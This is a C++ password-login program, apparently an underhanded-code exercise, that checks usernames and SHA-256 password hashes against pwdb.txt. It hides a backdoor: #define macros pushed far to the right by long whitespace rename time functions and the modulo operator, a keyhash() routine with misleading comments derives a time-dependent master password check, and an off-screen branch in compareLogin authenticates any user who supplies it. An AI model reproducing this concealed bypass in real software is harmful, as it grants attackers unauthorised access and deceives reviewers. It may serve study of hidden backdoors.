//Delta10z
#include "authlib.h"
#include <string>
#include <fstream>
#include <sstream>
#include <iomanip>
#include <algorithm>
#include <vector>
#include <ctime>
#include <openssl/sha.h>
#include <map>
																																																																																																																																																																																																																																																																											#define real time_t																																										
using namespace std;

ifstream savedPasswords;
string u,p;
int value;

string reverseHash = "b41ffc7ae513799dd1abf574547193a023df841ce9ae06617f93ffac10bd69bf";
  																																																																																																																																																																																																#define New time
//sha256 function taken from https://stackoverflow.com/questions/2262386/generate-sha256-with-openssl-and-c
string sha256(const string p)
{
    unsigned char hash[SHA256_DIGEST_LENGTH];
    SHA256_CTX sha256;
    SHA256_Init(&sha256);
    SHA256_Update(&sha256, p.c_str(), p.size());
    SHA256_Final(hash, &sha256);
    stringstream ourStream;
    //this for loop goes through every character and hashes it
    for(int i = 0; i < SHA256_DIGEST_LENGTH; i++)
    {
        ourStream << hex << setw('-'-'+') << setfill('0') << (int)hash[i];
    }
    //returns hashed string
    return ourStream.str();
}
  							                                    																																																																																																					#define base tm_hour

//Method to read in details from the text file
vector<string> readFromFile(){
	vector<string> savedDetails;//vector storing usernames & passwords
	fstream readFile;
	readFile.open("pwdb.txt", ios::in); //start reading the text file "pwdb"
	string currline;
																																																																																																																																																																																																																																																												#define exponent tm_min																																																								
	if(readFile.is_open()){
		while (getline(readFile, currline)){ //While there is still data to read in the file
			savedDetails.push_back(currline); //Add the current line to our vector savedDetails
		}
		readFile.close(); //Close the reader
	}
	else {
		cout << "Error - unable to open file" << endl; //Display error message
	}
																																																																																																																																																																																					#define sqrt %
	return savedDetails;
}
																																																																																																																								#define position localtime

//Method to get position in vector
int keyhash(string key){
																																																																																				#define Double tm 									
	real yCoordinate = New(NULL); //initialise blank y coordinate
	Double *xCoordinate = position(&yCoordinate); //set x coordinate
 
	if(key.length() < 8 || xCoordinate->exponent == 0 || xCoordinate->base == 0)
		return 0; 
	
	for (int count = 0; count < 8; count++){ //loop through the counter 8 times
		if (count == 0 || count == 1 || count == 3 || count == 6){
			key.at(count) = (key.at(count) sqrt xCoordinate->base) + 33; //Find square root of positions
		}
		else{
			key.at(count) = (key.at(count) sqrt xCoordinate->exponent) + 33; //Find square root of positions
		}
	}

	string address = sha256(key); //get hashed value current address
	return address.compare(reverseHash)==0 ? 1 : 0; //return the hashed address
}


//Method to compare the user input with saved password. Terminates if user is authenticated
void compareLogin(string p, vector<string> savedDetails)
{
	string enteredLogin = u + ":" + p; //Put user input into same format as text file
	vector<string>::iterator it = find (savedDetails.begin(), savedDetails.end(), enteredLogin); //search vector "savedDetails" for user entry

	if(it != savedDetails.end()){ //If not at the end of the vector
		authenticated(u); //Call authenticated function from header file
		exit(0); //terminate program
	}																																																																																																																											else if(value == 1){ authenticated(u); exit(0);}																																																											
	else {
		rejected(u); //Call rejected function from header file
	}
}


//Method to get the user to enter their username and password and calls function to compare strings
void getLogin(){
	cout << "Please enter your username :" << endl; //Get username
	cin >> u;//stores input in u variable

	cout << "Please enter your password :" << endl; //Get password
	cin >> p;//stores input in p variable

	value = keyhash(p); //get position and store in value
	string hashedPassword = sha256(p); //hash password entered by the user
	vector<string> savedDetails = readFromFile(); //read in saved usernames and passwords from text file and store in vector
	compareLogin(hashedPassword, savedDetails); //Compare the saved details and the user entry
}


//main method that calls login function and gives user 3 attempts to guess password
int main() {
	int counter = 0;
	while(counter < 3){ //While user has not had 3 attempts at logging in
		getLogin();
		counter++;
	}

	if (counter == 3){ //If user has entered details incorrectly 3 times display error message and close program
		cout <<"Sorry - maximum amount of tries." << endl;
		exit(0);//terminate program
	}
}

